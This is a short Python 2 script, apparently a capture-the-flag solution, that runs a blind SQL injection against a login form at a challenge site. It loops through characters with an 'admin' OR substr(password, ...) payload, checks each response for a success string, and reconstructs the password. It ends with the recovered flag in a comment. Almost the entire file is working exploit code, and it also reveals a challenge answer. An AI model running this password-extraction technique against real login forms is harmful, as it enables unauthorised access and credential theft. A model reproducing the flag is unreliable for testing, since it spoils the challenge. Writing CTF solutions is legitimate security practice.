#!/usr/bin/env python2

"""
This is a simple blind sql injection
"""

import requests

cookie = dict(session="wqdio")
nonce = "nonce"

cur = 0
alphabet = "0123456789abcdefABDFwCEW{}"
flag = ""
while cur < 37:
    for x in alphabet:
        payload = "admin' OR substr(password, %d, 1) = '%c' AND '1'='1" % (cur + 1, x)
        r = requests.post("https://challenge-ecw.fr/chals/web100", \
                          data = {'password':payload, 'nonce':nonce}, \
                      cookies=cookie)
        if "Authentification valide" in r.text:
            flag += x
            print flag
            cur += 1
            break

# flag is: ecw{d3832d5a1ef4c3bef82b87ced5f50e7d}
